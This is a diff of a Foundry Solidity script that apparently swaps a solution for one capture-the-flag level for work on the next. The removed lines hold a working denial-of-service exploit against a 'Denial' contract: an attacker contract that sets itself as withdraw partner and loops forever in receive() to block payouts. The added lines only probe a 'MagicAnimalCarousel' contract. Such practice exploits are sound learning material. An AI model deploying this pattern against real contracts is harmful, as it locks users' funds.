@@ -2,25 +2,11 @@
 pragma solidity ^0.8.0;
 
 import {Script, console} from "forge-std/Script.sol";
-import { Denial } from "../src/Denial.sol";
+import { MagicAnimalCarousel } from "../src/MagicAnimalCarousel.sol";
 
-contract Attacker {
-
-	Denial public instance = Denial(payable(0x0A249b5Fd7A895349cF5057d3dF79D0CC5cdB8C4));
-
-    function attack() external {
-        instance.setWithdrawPartner(address(this));
-    }
-
-    receive () external payable {
-        while (true) {}
-    }
-
-}
-
-contract DenialSolver is Script {
+contract MagicAnimalCarouselSolver is Script {
 	
-	Denial public instance = Denial(payable(0x0A249b5Fd7A895349cF5057d3dF79D0CC5cdB8C4));
+	MagicAnimalCarousel public instance = MagicAnimalCarousel(0x9811D61EF68c2244b80C56D8903AC559d154fBEf);
 
 	uint256 prv = vm.envUint("PRV");
 	address me = vm.envAddress("PUB");
@@ -29,8 +15,10 @@ contract DenialSolver is Script {
 
 		vm.startBroadcast(prv);
 
-        Attacker attacker = new Attacker();
-        attacker.attack();
+		// encodeAnimalName behaves just like bytes_to_long in python
+		console.logBytes32(bytes32(instance.encodeAnimalName("abcdabcdabcd")));
+	
+
 
 		vm.stopBroadcast();
 
